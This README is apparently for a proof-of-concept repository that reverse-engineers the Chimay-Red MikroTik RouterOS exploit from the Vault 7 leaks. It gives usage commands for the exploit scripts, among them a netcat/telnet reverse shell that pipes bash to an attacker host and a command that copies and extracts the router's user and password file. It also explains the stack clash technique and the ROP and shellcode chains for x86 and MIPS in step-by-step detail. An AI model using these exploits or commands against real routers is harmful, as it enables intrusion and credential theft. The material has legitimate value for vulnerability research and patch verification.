# Chimay-Red
Reverse engineering of Mikrotik exploit from Vault 7 CIA Leaks  

See the PDF for more info 

# Vulnerable versions  
Until RouterOS 6.38.4  

What's new in 6.38.5 (2017-Mar-09 11:32):  
!) www - fixed http server vulnerability;

# Proof of concepts
## CrashPOC  
Simple crash sending -1 as content-length in post header 

## StackClashPOC  
Stack clash exploit using two threads, missing ROP chain

## StackClashROPSystem  
Stack clash exploit using two threads  with ROP chain to run bash commands  

### For a reverse shell:  
```
$ nc -l -p 1234
$ ./StackClashROPsystem.py 192.168.8.1 80 www_binary "/bin/mknod /ram/f p; /bin/telnet 192.168.8.5 1234 < /ram/f | /bin/bash > /ram/f 2>&1"
```
Where:  
- RouterOS IP: 192.168.8.1  
- PC IP: 192.168.8.5  

### To extract users and passwords
```
$ ./StackClashROPsystem.py 192.168.8.1 80 www_binary "cp /rw/store/user.dat /ram/winbox.idx"
$ wget http://192.168.8.1/winbox/index
$ ./extract_user.py index
```

As the ROP is dynamically created, you have to extract the `www` binary from the RouterOS firmware.   
(It's placed in `/nova/bin/`)  
Check that the running version is the same.  
To simplify extraction you can use:
```
$ ./getROSbin.py 6.38.4 x86 /nova/bin/www www_binary
```

## StackClashMIPS  
Stack clash exploit using two threads with ROP chain + shell code to run bash commands  
On mips version of www the stack is RWX, so we can jump to the stack.

You can run the same bash command as the x86 version.  
The exploit in NOT dinamically created, so in versions different from 6.38.4 may not works.  

### LCD  
Funny command  
```
$ ./StackClashMIPS.py 192.168.8.1 80 "echo hello world > /dev/lcd"
```

# FAQ
#### Where does one get the chimay-red.py file, that this tool kit relies on?  
This is a reverse engineering of leaked CIA documentation.  
There is no chimay-red.py publicly available.  

#### I can't understand how the stack clash work.
I'll update the PDF as soon as I have enough time, anyway:  
We know that:  
- each thread has 128KB of stack  
- each stack of each thread is stacked on the top of the previous thread.  

Thanks to Content-Length and alloca macro we can control the Stack Pointer and where the post data will be written.  
If we send a Content-Length bigger than 128KB to socket of thread A, the Stack Pointer will point inside the stack of another thread (B) and so the POST data (of thread A) will be written inside the stack of thread B (in any position we want, we only need to adjust the Content-Length value).  
So now we can write a ROP chain in the stack of thread B starting from a position where a return address is saved.  
When we close the socket of thread B, the ROP chain will start because the function that is waiting for data will return (but on our modified address).

##### x86
The ROP chain that executes bash commands is using "dlsym" (present in the PLT) to find the address of "system".  
Once we have the address of system we construct the bash string looking for chunks of strings inside the binary and concatenating them in an unused area of memory.  
Then we return to the address of system passing as argument the address of the created bash string.  

##### mips
DEP is disabled on this version of www, so I can execute the stack.  
But I cannot use system function because "/bin/sh" is not present on the file system, so I used execve directly.  
A small ROP (3 gadgets) find the address of a location on the stack (where I put the shell code), and then jump to that address.  
In the shell code I populate an array of 4 pointers with the address of the strings "/bin/bash", "-c", "your_shell_cmd" using the leaked address of the stack (the last pointer is left NULL).  
Then I populate a0, a1, a2 with rispectively: address of "/bin/bash", address of the array populated at the preceeding step and the address of the NULL entry of the array.  
At this point I can launch the syscall 4011 (execve) to execute my bash command.  
